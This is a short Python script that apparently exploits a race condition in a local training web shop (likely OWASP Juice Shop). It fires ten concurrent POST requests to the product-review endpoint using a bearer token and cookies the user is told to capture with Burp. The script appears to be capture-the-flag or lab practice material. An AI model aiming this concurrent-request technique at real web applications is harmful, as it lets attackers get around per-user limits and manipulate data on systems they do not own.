import threading
import requests

def send_request():
    url = 'http://127.0.0.1:3000/rest/products/reviews'
    headers = {
        'Content-Length': '26',
        'sec-ch-ua': '"Chromium";v="123", "Not:A-Brand";v="8"',
        'X-User-Email': '{PLACE YOUR USER EMAIL HERE}',
        'sec-ch-ua-mobile': '?0',
        'Authorization': 'Bearer {PLACE YOUR TOKEN HERE. OBTAIN IT BY CAPTURING A REQUEST WITH BURP}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'sec-ch-ua-platform': '"Linux"',
        'Origin': 'http://127.0.0.1:3000',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'http://127.0.0.1:3000/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': '{PLACE YOUR COOKIES HERE. OBTAIN THEM BY CAPTURING A REQUEST WITH BURP}'
    }
    data = '{"id":"a9yWDzuwg8PSptLav"}'
    response = requests.post(url, headers=headers, data=data)
    print(response.text)

# Number of thread to launch
num_threads = 10

threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=send_request)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

